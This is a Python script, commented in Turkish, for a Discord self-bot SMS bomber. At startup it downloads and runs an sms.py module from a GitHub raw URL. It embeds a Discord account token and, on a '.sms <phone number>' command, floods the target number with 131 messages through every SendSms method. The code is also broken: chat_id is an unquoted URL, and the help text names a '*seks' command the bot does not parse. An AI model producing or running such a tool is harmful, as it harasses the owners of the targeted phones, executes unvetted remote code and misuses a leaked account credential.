import requests
from time import sleep
r = requests.get("https://raw.githubusercontent.com/GokuMUI1/gokuprivate/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("guncelleme yapio")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
    print("guncelleme basarili")
from sms import SendSms

token = "MTA3OTE5MDkxODY2MzUwMzk0Mg.G5NPFN.cEGg2o7piPl_s8pylx4eIempZTc9n03xHm2_fk" #bot olarak kullanmak istediğiniz hesabın Discord token'i.
chat_id = https://discord.com/channels/1079191098104217830/1079191098972446752 #sohbet id'si (int)

def getHeaders(token=None, content_type="application/json"):
    header = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        header.update({"Authorization": token})
    return header

def getChat(token, id):
    try:
        while 1:
            url = f"https://discord.com:443/api/v9/channels/{id}/messages?limit=100"
            r = requests.get(url, headers=getHeaders(token)).json()
            timestamp, content, id = r[0]["timestamp"], r[0]["content"], r[0]["author"]["id"]
            return timestamp, content, id
    except:
        print("Sohbet çekilirken sorun meydana geldi!")

def send(token, id:str, text):    
    url = f"https://discord.com:443/api/v9/channels/{id}/messages"
    headers = getHeaders(token)
    json={"content": text, "nonce": "", "tts": False}
    r = requests.post(url, headers=headers, json=json)
    if r.status_code == 200:
        return("Mesaj Gönderildi!")
    else:
        return("Mesaj gönderilemedi!")        

zaman = []

adet = 131#SMS sayısı

saniye = 0#aralık(saniye)

while 1:
    timestamp, content, id = getChat(token, chat_id)
    if len(content.split(" ")) == 2 and content.split(" ")[0] == ".sms":
        if len(content.split(" ")[1]) == 10:
            telno = content.split(" ")[1]
            send(token, chat_id, f"{telno} numarasina gonderiliyor\n<@{id}>")  
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            send(token, chat_id, telno+" --> "+str(sms.adet)+f" adet mesaj gonderdim.\n<@{id}>")                        
        else:
            send(token, chat_id, f"gecerli komut yaz\nyardim icin' .help ' yaz veya dmden yaz\n<@{id}>")
            zaman.append(timestamp)
    elif ".help" == content and timestamp not in zaman:
        zaman.append(timestamp)
        send(token, chat_id, f"sms gondermek icin su sekilde yaz\n*seks 5051234567\n*seks (telefon numarası)\n<@{id}>")
    elif ".status" == content and timestamp not in zaman:
        zaman.append(timestamp)
        mesaj = "" #mesajınızı yazınız
        send(token, chat_id, mesaj+f"\n<@{id}>")
    else:
        pass